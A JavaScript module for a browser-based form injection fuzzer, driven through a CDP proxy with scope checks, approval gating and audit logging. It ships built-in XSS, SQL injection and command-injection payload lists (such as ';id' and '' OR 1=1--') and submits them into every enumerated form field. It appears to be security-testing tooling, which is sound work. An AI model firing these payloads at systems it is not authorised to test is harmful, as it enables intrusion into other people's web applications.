// form-fuzzer.mjs — 浏览器表单注入 fuzz(T2-2b-4-3): 经 cdp-proxy 原语组合, CLI/模块形态(不注册 dsh 工具)。
// 流程(审计实证): /new → /navigate → 字段枚举(①一条 /eval JSON.stringify(querySelectorAll(
// 'input,select,textarea') 映射)) → 逐字段 /fill 注入(cdp-proxy.mjs:266-274 原生 setter+input/change
// 事件, React 受控组件同效) → /click 提交(②button[type=submit]; 无按钮回退 /eval form.requestSubmit())
// → /eval 抓响应(DOM settle 轮询 或 页内 fetch 钩直拿响应体 ③) → evaluateAssertions 断言 → 结果数组。
// DOM 差异(⑤): 前后各一条 /eval outerHTML。
// 审批面纪律(工具自身发审计行): 表单提交语义调用照审批面新规 — approvals.mjs classifyRisk
//   browser-state-change(host:port + /fill|/click|/clickAt + 提交语义三重合取, 恒 high 走审批;
//   tier-approval.mjs 同串镜像)。本工具每次提交动作发审计行(含可直接机检的 cmd 形态);
//   /eval requestSubmit 回退的传输路由(/eval)不在审批面机检词表内, 审计行以 planeMatch:false
//   自报该缺口 — 宁过报不过漏。
// 词表: 内建 XSS/SQLi/命令注入小字典(各 <20 条经典形态) + 可选 list 参数(payload 集解析形态照
//   tools/intruder.mjs:31-41 resolvePayloads: 未知词表名拒绝 / 空集拒绝)。
import path from 'node:path'
import { pathToFileURL } from 'node:url'
import { cdpFetch, isOk, assertEvaluation, DOM_SNAPSHOT_EXPR, SETTLE_EXPR, noopAudit, parseArgs, fileAuditSink, cdpProxyBase, readCdpToken } from './cdp-client.mjs'

// ---- 内建小字典(经典形态; 各 <20 条) ----
export const BUILTIN_WORDLISTS = {
  xss: [
    '<img src=x onerror=1>',
    '<img src=x onerror=window.__fuzzhit=1>',
    '<svg onload=1>',
    '<svg/onload=alert(1)>',
    '<script>1</script>',
    '"><img src=x onerror=1>',
    'javascript:alert(1)',
    '<iframe src=javascript:1>',
    '<body onload=1>',
    '{{7*7}}',
  ],
  sqli: [
    "' OR 1=1--",
    '" OR 1=1--',
    "' OR '1'='1",
    "admin'--",
    '1 AND 1=1',
    '1 AND 1=2',
    "1' ORDER BY 1--",
    "' UNION SELECT NULL--",
    '1 AND SLEEP(0)--',
    '` OR 1=1--',
  ],
  cmdi: [
    ';id',
    '|id',
    '|| id',
    '&& id',
    '$(id)',
    '; id #',
    '`id`',
    '%0aid',
    '& id &',
  ],
}

/** payload 集: 内建(逗号分名) + 自定义 list; 空集/未知名拒绝(形态照 intruder.mjs:31-41)。 */
export function buildPayloads({ builtin = 'xss,sqli,cmdi', list = [] } = {}) {
  const out = []
  for (const name of String(builtin ?? '').split(',').map((x) => x.trim()).filter(Boolean)) {
    const w = BUILTIN_WORDLISTS[name]
    if (!w) return { error: `未知内建词表: ${name}(可用: ${Object.keys(BUILTIN_WORDLISTS).join(', ')})` }
    out.push(...w)
  }
  for (const p of Array.isArray(list) ? list : []) out.push(String(p))
  if (!out.length) return { error: 'payload 集为空 — 传 builtin=xss/sqli/cmdi 或 list=[...]' }
  return { payloads: [...new Set(out)] }
}

/** 字段枚举表达式(审计实证①): 一条 /eval 返回全部表单字段的 JSON 映射。 */
export function fieldsProbeExpr() {
  return `(() => { /*FF_FIELDS*/
    const els = [...document.querySelectorAll('input,select,textarea')]
    return JSON.stringify(els.map((el, i) => {
      const nameAttr = el.getAttribute('name')
      const sel = el.id ? ('#' + (window.CSS && window.CSS.escape ? window.CSS.escape(el.id) : el.id))
        : (nameAttr ? el.tagName.toLowerCase() + '[name=' + JSON.stringify(nameAttr) + ']'
        : el.tagName.toLowerCase() + ':nth-of-type(' + (i + 1) + ')')
      const root = el.form || document
      return { i, tag: el.tagName.toLowerCase(), type: el.getAttribute('type') || '', id: el.id || '',
        name: nameAttr || '', placeholder: el.getAttribute('placeholder') || '',
        required: Boolean(el.required), disabled: Boolean(el.disabled),
        formAction: el.form ? String(el.form.getAttribute('action') ?? '') : '',
        submitBtns: root.querySelectorAll('button[type=submit],input[type=submit]').length,
        selector: sel }
    }))
  })()`
}

/** fieldsProbeExpr 的 /eval 结果解析(信封/{value}/裸 JSON 串均可)。失败 fail-safe 返回 {fields:[],error}。 */
export function enumerateFields(raw) {
  let v = raw
  if (v && typeof v === 'object' && !Array.isArray(v)) v = v?.data?.value !== undefined ? v.data.value : v.value
  if (v == null) return { fields: [], error: 'fields probe 无结果(eval value 空)' }
  if (typeof v !== 'string') { try { v = JSON.stringify(v) } catch { v = '' } }
  let parsed
  try { parsed = JSON.parse(String(v)) } catch (e) { return { fields: [], error: `fields probe 非 JSON: ${String(e).slice(0, 80)}` } }
  if (!Array.isArray(parsed)) return { fields: [], error: 'fields probe 结果非数组' }
  const fields = parsed
    .filter((f) => f && typeof f === 'object' && f.selector)
    .map((f) => ({
      index: Number(f.i ?? f.index ?? 0), tag: String(f.tag ?? ''), type: String(f.type ?? ''),
      id: String(f.id ?? ''), name: String(f.name ?? ''), placeholder: String(f.placeholder ?? ''),
      formAction: String(f.formAction ?? ''), submitBtns: Number(f.submitBtns ?? 0),
      disabled: Boolean(f.disabled), selector: String(f.selector),
    }))
  return { fields, error: '' }
}

/** 提交后页内 fetch 钩直拿响应体(审计实证③): /eval (async()=>{...})() awaitPromise 直拿。 */
export function fetchCaptureExpr({ submitSelector = 'button[type=submit], input[type=submit]', waitMs = 800 } = {}) {
  return `(async () => { /*FF_FETCH_CAPTURE*/
    const orig = window.fetch
    let lastResp = null
    window.fetch = async (...args) => {
      const res = await orig(...args)
      try { const text = await res.clone().text(); lastResp = { status: res.status, body: String(text).slice(0, 4000) } } catch {}
      return res
    }
    try {
      const btn = document.querySelector(${JSON.stringify(submitSelector)})
      if (!btn) { window.fetch = orig; return JSON.stringify({ hookCount: 0, submit: false }) }
      const form = btn.closest ? btn.closest('form') : null
      if (form && typeof form.requestSubmit === 'function') form.requestSubmit(); else btn.click()
      await new Promise((r) => setTimeout(r, ${Number(waitMs)}))
    } finally { window.fetch = orig }
    return JSON.stringify({ hookCount: lastResp ? 1 : 0, submit: true, status: lastResp?.status ?? null, body: lastResp?.body ?? '' })
  })()`
}

/** DOM settle 捕获(⑤): 以「上一次提交后 HTML」为基线轮询变更, 顺带做选择器页内评估(选择器断言用)。 */
export function domCaptureExpr({ baselineHtml = '', selectors = [], settleMs = 2500 } = {}) {
  return `(async () => { /*FF_CAPTURE*/
    const t0 = Date.now()
    const grab = () => ({
      html: String(document.documentElement.outerHTML || '').slice(0, 262144),
      text: String((document.body && (document.body.innerText || document.body.textContent)) || '').replace(/\\s+/g, ' ').slice(0, 4000),
      selectors: (${JSON.stringify(selectors)}).map((sel) => {
        try {
          const el = document.querySelector(sel)
          if (!el) return { selector: sel, exists: false, value: null }
          const isField = /^(INPUT|TEXTAREA|SELECT)$/.test(el.tagName || '')
          return { selector: sel, exists: true, value: String(isField ? el.value : (el.textContent ?? '')) }
        } catch (e) { return { selector: sel, exists: false, value: null, error: String(e).slice(0, 80) } }
      }),
    })
    const baseline = ${JSON.stringify(String(baselineHtml ?? ''))}
    let snap = grab()
    while (Date.now() - t0 < ${Number(settleMs)} && snap.html === baseline) {
      await new Promise((r) => setTimeout(r, 200)); snap = grab()
    }
    return JSON.stringify({ ...snap, changed: snap.html !== baseline, settleMs: Date.now() - t0 })
  })()`
}

/**
 * 表单 fuzz 主流程(纯编排, 传输经注入的 cdpFetchImpl — 测试 mock 不真开 chrome)。
 * 返回 { ok, denied, targetId, fields, payloads, planned, submitted, skipped, results, auditNotes, error }。
 * results 项: { field, selector, payload, submitVia, fillOk, changed, capture, hit, hits, misses, error }。
 */
export async function runFormFuzz({
  base, token, url,
  fields = null,                    // 显式字段数组(跳过枚举 /eval), 形态同 enumerateFields 输出项
  builtin = 'xss,sqli,cmdi', list = [],
  payloads = null,                  // 显式 payload 集(跳过 buildPayloads)
  assertions = [],
  capture = 'dom',                  // 'dom' | 'fetch'
  submitSelector = 'button[type=submit], input[type=submit]',
  maxFields = 20, maxSubmissions = 100,
  cdpFetchImpl = cdpFetch, audit = noopAudit,
} = {}) {
  const auditNotes = []
  const say = (line) => { auditNotes.push(line); try { audit(line) } catch {} }
  const want = buildPayloads({ builtin, list })
  if (want.error) return { ok: false, error: want.error, results: [], auditNotes }
  const pls = Array.isArray(payloads) && payloads.length ? payloads.map(String) : want.payloads

  // 流程: /new(about:blank 免 scope 重复校验) → /navigate(目标, proxy 侧过 scope 闸) → settle 等就绪
  const created = await cdpFetchImpl(base, token, '/new', { url: 'about:blank' })
  if (created.code === 403) return { ok: false, denied: true, error: `cdp-proxy scope 拒绝: ${created.data?.error ?? url}`, results: [], auditNotes }
  const targetId = created.data?.targetId
  if (!isOk(created) || !targetId) return { ok: false, error: `/new ${created.code || 'ERR'}: ${created.data?.error ?? created.err ?? 'no targetId'}`, results: [], auditNotes }

  try {
    const nav = await cdpFetchImpl(base, token, '/navigate', { target: targetId, url })
    if (!isOk(nav)) return { ok: false, targetId, error: `/navigate: ${nav.data?.error ?? nav.err ?? nav.code}`, results: [], auditNotes }
    await cdpFetchImpl(base, token, '/eval', { target: targetId, expression: SETTLE_EXPR })

    let fieldList = []
    if (Array.isArray(fields) && fields.length) fieldList = fields
    else {
      const probe = await cdpFetchImpl(base, token, '/eval', { target: targetId, expression: fieldsProbeExpr() })
      const parsed = enumerateFields(probe)
      if (parsed.error) return { ok: false, targetId, error: parsed.error, results: [], auditNotes }
      fieldList = parsed.fields
    }
    const skippedDisabled = fieldList.filter((f) => f.disabled || f.type === 'hidden').length
    fieldList = fieldList.filter((f) => !f.disabled && f.type !== 'hidden')
    fieldList = fieldList.slice(0, Math.max(1, maxFields))

    // ⑤ 前: 基线 DOM 快照
    const before = await cdpFetchImpl(base, token, '/eval', { target: targetId, expression: DOM_SNAPSHOT_EXPR })
    let lastHtml = typeof before.data?.value === 'string' ? before.data.value : ''

    const plan = []
    for (const f of fieldList) for (const p of pls) plan.push({ field: f, payload: p })
    const planned = plan.length
    const capped = plan.slice(0, Math.max(1, maxSubmissions))
    const skipped = Math.max(0, planned - capped.length) + skippedDisabled

    // 审批面新规说明(工具自身发审计行): 提交语义 = 状态变更类, 恒 high 走审批。
    say({
      event: 'browser-state-change-notice', tool: 'form-fuzzer', target: targetId, url: String(url).slice(0, 200),
      submitSelector, capture,
      note: '表单提交语义调用照审批面新规(approvals.mjs classifyRisk browser-state-change, tier-approval.mjs 同串镜像, 恒 high): 本运行的 /fill 注入 + /click 提交序列须审批通过方可执行; 每次提交另发机检 cmd 行。CLI/模块形态不经 dsh tool-gate, 本行由工具自身落盘说明。',
    })

    const results = []
    let submitViaUsed = null
    for (const { field, payload } of capped) {
      const item = { field: field.name || field.id || field.selector, selector: field.selector, payload, submitVia: null, fillOk: false, changed: null, capture: null, hit: null, hits: [], misses: [], error: '' }
      try {
        const fill = await cdpFetchImpl(base, token, '/fill', { target: targetId, selector: field.selector, value: payload })
        item.fillOk = Boolean(fill.data?.ok) && fill.code === 200
        // 提交: ② /click button[type=submit]; miss → 回退 /eval form.requestSubmit()
        let submit = await cdpFetchImpl(base, token, '/click', { target: targetId, selector: submitSelector })
        const clicked = Boolean(submit.data?.hit)
        item.submitVia = clicked ? 'click' : 'page'
        submitViaUsed = item.submitVia
        if (clicked) {
          say({
            event: 'browser-state-change', tool: 'form-fuzzer', submitVia: 'click', planeMatch: true,
            cmd: `cdp-proxy POST ${base}/click ${JSON.stringify({ target: targetId, selector: submitSelector })}`,
            note: '提交动作审计行(cmd 形态可过 approvals.mjs isBrowserStateChange 三重合取机检): browser-state-change → 高危走审批。',
          })
        } else {
          const fb = await cdpFetchImpl(base, token, '/eval', { target: targetId, expression: `(() => { const f = document.querySelector('form'); if (!f) return false; f.requestSubmit(); return true })()` })
          item.error = isOk(fb) && fb.data?.value === true ? '' : 'submit: 无提交按钮且 requestSubmit 回退失败'
          say({
            event: 'browser-state-change', tool: 'form-fuzzer', submitVia: 'page(requestSubmit)', planeMatch: false,
            cmd: `cdp-proxy POST ${base}/eval ${JSON.stringify({ target: targetId, expression: "form.requestSubmit()" })}`,
            note: 'requestSubmit 回退经 /eval 传输 — 审批面三重合取的机检路由表(/fill|/click|/clickAt)不含 /eval, 机械机检不命中; 本行自报该调用同属提交语义(状态变更), 应同 browser-state-change 档走审批(宁过报不过漏)。',
          })
        }
        // 抓响应: 'dom' settle 轮询 / 'fetch' 页内 fetch 钩
        let captureEnv
        if (capture === 'fetch') captureEnv = await cdpFetchImpl(base, token, '/eval', { target: targetId, expression: fetchCaptureExpr({ submitSelector }) })
        else {
          captureEnv = await cdpFetchImpl(base, token, '/eval', { target: targetId, expression: domCaptureExpr({ baselineHtml: lastHtml, selectors: assertions.filter((a) => a && typeof a === 'object' && /^selector_/.test(String(a.type ?? ''))).map((a) => String(a.selector ?? '')) }) })
        }
        const capVal = captureEnv.data?.value
        let cap = typeof capVal === 'string' ? JSON.parse(capVal) : capVal
        if (capture === 'dom' && cap && typeof cap.html === 'string') lastHtml = cap.html
        item.changed = Boolean(cap?.changed ?? (cap?.hookCount > 0))
        item.capture = cap ?? null
        // 断言桥: validator evaluateAssertions — dom 模式断言面 = 页面文本(html_contains/regex
        // 语义收敛到 text, 避免吃进 capture JSON 里回显的选择器值); fetch 模式 = 完整捕获 JSON
        // (status/body 可被 json_path 命中); selector_* 一律吃页内评估结果 — 仅 dom 模式产出
        if (Array.isArray(assertions) && assertions.length) {
          const assertEnv = capture === 'fetch' ? captureEnv : { code: captureEnv.code, data: { value: String(cap?.text ?? '') } }
          const v = assertEvaluation(assertEnv, assertions, { channel: 'cdp', selectors: Array.isArray(cap?.selectors) ? cap.selectors : [] })
          item.hit = v.hit; item.hits = v.hits; item.misses = v.misses
        }
      } catch (e) { item.error = String(e?.message ?? e).slice(0, 200) }
      // 复位: 清空本字段, 隔离下一 payload 的残留(失败不翻转结果)
      await cdpFetchImpl(base, token, '/fill', { target: targetId, selector: field.selector, value: '' }).catch(() => {})
      results.push(item)
    }

    // ⑤ 后: 终态 DOM 快照(与基线构成前后差分证据)
    const after = await cdpFetchImpl(base, token, '/eval', { target: targetId, expression: DOM_SNAPSHOT_EXPR })
    const domDiff = { changed: typeof after.data?.value === 'string' && after.data.value !== lastHtml && lastHtml !== '', beforeLen: lastHtml.length, afterLen: typeof after.data?.value === 'string' ? after.data.value.length : 0 }

    return {
      ok: results.every((r) => !r.error), targetId, fields: fieldList, payloads: pls,
      planned, submitted: results.length, skipped, capture, domDiff, results, auditNotes,
    }
  } finally {
    await cdpFetchImpl(base, token, '/close', { target: targetId }).catch(() => {})
  }
}

// ---- CLI ----
function main() {
  const a = parseArgs(process.argv.slice(2))
  const base = a.base || cdpProxyBase(process.env)
  const token = a.token || readCdpToken(process.env)
  const url = a.url
  if (!url) { console.error('用法: node form-fuzzer.mjs --base http://127.0.0.1:8893 --url <scope 内目标> [--builtin xss,sqli,cmdi] [--list a,b] [--fields #id,#name] [--assertions \'{"type":"html_contains","value":"..."}\'|JSON 数组] [--capture dom|fetch] [--audit-file <path>]'); process.exitCode = 2; return }
  let assertions = []
  if (a.assertions) { try { assertions = JSON.parse(a.assertions) } catch { console.error('--assertions 须为 JSON 数组'); process.exitCode = 2; return } }
  const fields = a.fields ? String(a.fields).split(',').map((s) => ({ selector: s.trim() })).filter((f) => f.selector) : null
  runFormFuzz({
    base, token, url, fields, builtin: a.builtin ?? 'xss,sqli,cmdi',
    list: a.list ? String(a.list).split(',') : [],
    assertions, capture: a.capture === 'fetch' ? 'fetch' : 'dom',
    maxFields: Number(a['max-fields'] ?? 20), maxSubmissions: Number(a['max-submissions'] ?? 100),
    audit: fileAuditSink(a['audit-file'] ? { ...process.env, P2P_ATTACK_AUDIT: a['audit-file'] } : process.env),
  }).then((r) => {
    console.log(JSON.stringify({
      ok: r.ok, denied: r.denied ?? false, error: r.error ?? '', planned: r.planned, submitted: r.submitted, skipped: r.skipped,
      domDiff: r.domDiff, auditNotes: r.auditNotes,
      hits: (r.results ?? []).filter((x) => x.hit === true).map((x) => ({ field: x.field, payload: String(x.payload).slice(0, 60), hits: x.hits })),
    }, null, 2))
  }).catch((e) => { console.error(String(e?.message ?? e)); process.exitCode = 1 })
}

const isMain = process.argv[1] && import.meta.url === pathToFileURL(path.resolve(process.argv[1])).href
if (isMain) main()
